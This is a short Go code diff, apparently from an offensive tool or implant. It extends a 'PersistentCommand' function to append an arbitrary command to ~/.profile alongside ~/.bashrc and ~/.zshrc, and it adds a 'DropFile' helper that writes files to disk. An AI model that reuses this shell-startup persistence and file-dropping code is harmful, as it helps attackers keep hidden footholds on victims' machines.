@@ -50,8 +50,17 @@ func RunCmd(cmd string) (string, bool) {
 }
 
 func PersistentCommand(cmd string) bool {
-	_, b := RunCmd(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
+	_, b := RunCmd(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc; echo "%s" >> ~/.profile`, cmd, cmd, cmd))
 	return b
+}
+
+func DropFile(content, path, name string) bool {
+	fullPath := filepath.Join(path, name)
+	err := os.WriteFile(fullPath, []byte(content), 0644)
+	if err != nil {
+		return false
+	}
+	return true
 }
 
 func RandomString(length int) string {
